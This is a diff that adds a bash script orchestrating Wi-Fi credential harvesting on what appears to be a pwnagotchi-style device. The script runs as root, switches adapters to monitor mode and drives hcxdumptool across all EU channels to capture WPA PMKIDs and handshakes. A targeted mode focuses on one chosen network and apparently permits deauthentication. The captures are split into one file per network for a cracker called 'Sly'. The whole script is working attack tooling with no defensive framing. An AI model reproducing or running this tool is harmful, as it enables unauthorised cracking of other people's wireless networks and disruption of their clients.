@@ -1,0 +1,146 @@
+#!/bin/bash
+#
+# Scout orchestrator (Fennec harvester module). Runs as root via fennec-scout.service.
+# Drives one or two monitor-mode adapters with hcxdumptool to harvest WPA PMKIDs
+# and 4-way handshakes, then splits the capture into one pcap per network where
+# Sly already reads them, so cracking needs no change.
+#
+# Config is read from /tmp/fennec-scout/config.json (written by scout_engine.py):
+#   mode     : "wide" (PMKID + opportunistic, no deauth) or "targeted"
+#   adapters : list of monitor-capable interfaces to use (1 or 2)
+#   target   : targeted mode only, {bssid, name, channel}
+#
+# Stats for the launcher are written to /tmp/fennec-scout/stats.json.
+#
+# NOTE (verify on the Pi): the exact hcxdumptool flags depend on its version
+# (Trixie ships v6.x). The invocations below use the v6 syntax; adjust -c / the
+# deauth and filter flags here if the installed version differs.
+set -u
+
+RUN_DIR=/tmp/fennec-scout
+CONFIG="$RUN_DIR/config.json"
+STATS="$RUN_DIR/stats.json"
+PCAP="$RUN_DIR/scout.pcapng"
+FILTER="$RUN_DIR/target.bssid"
+HANDSHAKES=/etc/pwnagotchi/handshakes
+
+# EU channel plan. One adapter sweeps everything; two split the bands.
+BAND24="1,2,3,4,5,6,7,8,9,10,11,12,13"
+BAND5="36,40,44,48,149,153,157,161,165"
+BANDALL="$BAND24,$BAND5"
+
+mkdir -p "$RUN_DIR"
+chmod 755 "$RUN_DIR"
+rm -f "$PCAP" "$FILTER"
+mkdir -p "$HANDSHAKES"
+
+[ -f "$CONFIG" ] || { echo "no config"; exit 1; }
+
+MODE=$(python3 -c 'import json,sys;print(json.load(open(sys.argv[1])).get("mode","wide"))' "$CONFIG" 2>/dev/null)
+IFACES=$(python3 -c 'import json,sys;print(" ".join(json.load(open(sys.argv[1])).get("adapters") or []))' "$CONFIG" 2>/dev/null)
+TGT_BSSID=$(python3 -c 'import json,sys;t=json.load(open(sys.argv[1])).get("target") or {};print(t.get("bssid",""))' "$CONFIG" 2>/dev/null)
+TGT_CHAN=$(python3 -c 'import json,sys;t=json.load(open(sys.argv[1])).get("target") or {};print(t.get("channel","") or "")' "$CONFIG" 2>/dev/null)
+
+[ -n "$IFACES" ] || { echo "no adapters"; exit 1; }
+set -- $IFACES
+IFACE1="$1"
+IFACE2="${2:-}"
+
+monitor_up() {
+    local i="$1"
+    ip link set "$i" down 2>/dev/null || true
+    iw dev "$i" set type monitor 2>/dev/null || true
+    ip link set "$i" up 2>/dev/null || true
+}
+
+pids=()
+cleanup() {
+    kill "${pids[@]}" 2>/dev/null
+    pkill -f "hcxdumptool.*$PCAP" 2>/dev/null
+    exit 0
+}
+trap cleanup TERM INT
+
+monitor_up "$IFACE1"
+[ -n "$IFACE2" ] && monitor_up "$IFACE2"
+
+# Write the initial stats so the UI shows "running" immediately.
+python3 - "$STATS" "$MODE" "$IFACE1" "$IFACE2" <<'PY' 2>/dev/null
+import json, sys
+json.dump({"mode": sys.argv[2], "status": "running",
+           "handshakes": 0, "pmkid": 0, "aps": 0, "recent": []},
+          open(sys.argv[1], "w"))
+PY
+chmod 644 "$STATS" 2>/dev/null
+
+start_hcx() {
+    # $1 interface, $2 channel list
+    local i="$1" ch="$2"
+    if [ "$MODE" = "targeted" ] && [ -n "$TGT_BSSID" ]; then
+        echo "$TGT_BSSID" | tr -d ':' | tr 'A-F' 'a-f' > "$FILTER"
+        local c="${TGT_CHAN:-$ch}"
+        hcxdumptool -i "$i" -o "$PCAP" -c "$c" \
+            --filterlist_ap="$FILTER" --filtermode=2 --enable_status=3 \
+            >> "$RUN_DIR/run.log" 2>&1 &
+    else
+        # Wide: PMKID + opportunistic handshakes, deauth disabled.
+        hcxdumptool -i "$i" -o "$PCAP" -c "$ch" \
+            --disable_deauthentication --enable_status=3 \
+            >> "$RUN_DIR/run.log" 2>&1 &
+    fi
+    pids+=($!)
+}
+
+if [ -n "$IFACE2" ] && [ "$MODE" != "targeted" ]; then
+    start_hcx "$IFACE1" "$BAND24"
+    start_hcx "$IFACE2" "$BAND5"
+else
+    start_hcx "$IFACE1" "$BANDALL"
+fi
+
+sanitize() { echo "$1" | tr -c 'A-Za-z0-9._-' '_' | cut -c1-32; }
+
+# Split the rolling capture into one pcap per network for Sly, and refresh stats.
+while true; do
+    sleep 10
+    [ -s "$PCAP" ] || continue
+
+    hs=0; pmkid=0; aps=0
+    if command -v hcxpcapngtool >/dev/null; then
+        summary=$(hcxpcapngtool "$PCAP" 2>&1 >/dev/null)
+        hs=$(echo "$summary"    | grep -iE "EAPOL.*pairs|handshake" | grep -oE '[0-9]+' | head -1)
+        pmkid=$(echo "$summary" | grep -iE "PMKID"                  | grep -oE '[0-9]+' | head -1)
+        aps=$(echo "$summary"   | grep -iE "access points|BEACON"   | grep -oE '[0-9]+' | head -1)
+    fi
+    hs=${hs:-0}; pmkid=${pmkid:-0}; aps=${aps:-0}
+
+    recent="[]"
+    if command -v tshark >/dev/null; then
+        bssids=$(tshark -r "$PCAP" -Y "eapol" -T fields -e wlan.bssid 2>/dev/null | tr 'A-F' 'a-f' | sort -u | grep -E '^[0-9a-f:]{17}$')
+        items=""
+        for b in $bssids; do
+            hex=$(echo "$b" | tr -d ':')
+            essid=$(tshark -r "$PCAP" -Y "wlan.fc.type_subtype==0x08 && wlan.bssid==$b" \
+                    -T fields -e wlan.ssid 2>/dev/null | grep -v '^$' | head -1)
+            name=$(sanitize "${essid:-unknown}")
+            out="$HANDSHAKES/${name}_${hex}.pcap"
+            tshark -r "$PCAP" -Y "wlan.bssid==$b" -w "$out" 2>/dev/null || true
+            chmod 644 "$out" 2>/dev/null || true
+            items="$items${items:+,}{\"name\":\"${name}\",\"bssid\":\"${b}\",\"type\":\"HS\"}"
+        done
+        [ -n "$items" ] && recent="[$items]"
+    fi
+
+    python3 - "$STATS" "$MODE" "$hs" "$pmkid" "$aps" "$recent" <<'PY' 2>/dev/null
+import json, sys
+try:
+    recent = json.loads(sys.argv[6])
+except Exception:
+    recent = []
+json.dump({"mode": sys.argv[2], "status": "running",
+           "handshakes": int(sys.argv[3]), "pmkid": int(sys.argv[4]),
+           "aps": int(sys.argv[5]), "recent": recent[:20]},
+          open(sys.argv[1], "w"))
+PY
+    chmod 644 "$STATS" 2>/dev/null
+done
